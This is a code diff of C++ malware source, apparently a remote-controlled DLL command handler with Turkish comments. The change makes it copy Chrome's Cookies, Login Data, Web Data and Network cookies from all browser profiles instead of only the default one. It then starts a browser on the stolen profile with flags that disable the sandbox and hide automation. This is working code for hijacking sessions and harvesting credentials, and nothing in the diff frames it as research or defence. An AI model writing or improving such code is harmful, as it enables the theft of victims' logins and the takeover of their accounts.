@@ -1356,35 +1356,36 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
 
                     if (!sourceProfile.empty()) {
                         send_status("Profiller kopyalanıyor...");
-                        // Hızı artırmak için sadece kritik dosyaları kopyala
                         SHCreateDirectoryExW(NULL, destProfile.c_str(), NULL);
 
-                        wstring localStateSrc = sourceProfile + L"\\Local State";
-                        wstring localStateDest = destProfile + L"\\Local State";
-                        CopyFileW(localStateSrc.c_str(), localStateDest.c_str(), FALSE);
+                        // Root seviyesindeki kritik dosyalar
+                        CopyFileW((sourceProfile + L"\\Local State").c_str(), (destProfile + L"\\Local State").c_str(), FALSE);
 
-                        wstring destDefault = destProfile + L"\\Default";
-                        SHCreateDirectoryExW(NULL, destDefault.c_str(), NULL);
+                        // Tüm profil klasörlerini (Default ve Profile X) tara ve kopyala
+                        WIN32_FIND_DATAW findData;
+                        HANDLE hFind = FindFirstFileW((sourceProfile + L"\\*").c_str(), &findData);
+                        if (hFind != INVALID_HANDLE_VALUE) {
+                            do {
+                                wstring name = findData.cFileName;
+                                if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
+                                    (name == L"Default" || name.find(L"Profile ") == 0)) {
 
-                        // En kritik dosyalar (Hız için liste daraltıldı)
-                        vector<wstring> essentialFiles = {
-                            L"Cookies", L"Login Data", L"Web Data", L"Preferences",
-                            L"Secure Preferences"
-                        };
+                                    wstring srcProfPath = sourceProfile + L"\\" + name;
+                                    wstring dstProfPath = destProfile + L"\\" + name;
+                                    SHCreateDirectoryExW(NULL, dstProfPath.c_str(), NULL);
 
-                        for (const auto& f : essentialFiles) {
-                            wstring fSrc = sourceProfile + L"\\Default\\" + f;
-                            wstring fDest = destDefault + L"\\" + f;
-                            CopyFileW(fSrc.c_str(), fDest.c_str(), FALSE);
+                                    vector<wstring> files = { L"Cookies", L"Login Data", L"Web Data", L"Preferences", L"Secure Preferences" };
+                                    for (const auto& f : files)
+                                        CopyFileW((srcProfPath + L"\\" + f).c_str(), (dstProfPath + L"\\" + f).c_str(), FALSE);
+
+                                    wstring srcNet = srcProfPath + L"\\Network";
+                                    wstring dstNet = dstProfPath + L"\\Network";
+                                    SHCreateDirectoryExW(NULL, dstNet.c_str(), NULL);
+                                    CopyFileW((srcNet + L"\\Cookies").c_str(), (dstNet + L"\\Cookies").c_str(), FALSE);
+                                }
+                            } while (FindNextFileW(hFind, &findData));
+                            FindClose(hFind);
                         }
-
-                        // Network/Cookies kopyala (Yeni Chrome sürümleri için kritik)
-                        wstring destNetwork = destDefault + L"\\Network";
-                        SHCreateDirectoryExW(NULL, destNetwork.c_str(), NULL);
-                        wstring netCookiesSrc = sourceProfile + L"\\Default\\Network\\Cookies";
-                        wstring netCookiesDest = destNetwork + L"\\Cookies";
-                        CopyFileW(netCookiesSrc.c_str(), netCookiesDest.c_str(), FALSE);
-
                         clean_profile(destProfile);
                     }
 
@@ -1392,7 +1393,6 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
 
                     // Modern Chromium tarayıcılar için görünürlüğü ve kararlılığı artıran bayraklar
                     wstring args = L" --user-data-dir=\"" + destProfile + L"\""
-                                   L" --profile-directory=\"Default\""
                                    L" --no-sandbox"
                                    L" --disable-gpu"
                                    L" --window-size=1280,720"
@@ -1423,7 +1423,8 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                                    L" --disable-breakpad"
                                    L" --disable-default-apps"
                                    L" --disable-blink-features=AutomationControlled"
-                                   L" --lang=en-US";
+                                   L" --lang=en-US"
+                                   L" --enable-features=NetworkServiceInProcess";
 
                     wstring fullCmd = L"\"" + exePath + L"\"" + args;
                     vector<wchar_t> cmdLine(fullCmd.begin(), fullCmd.end());
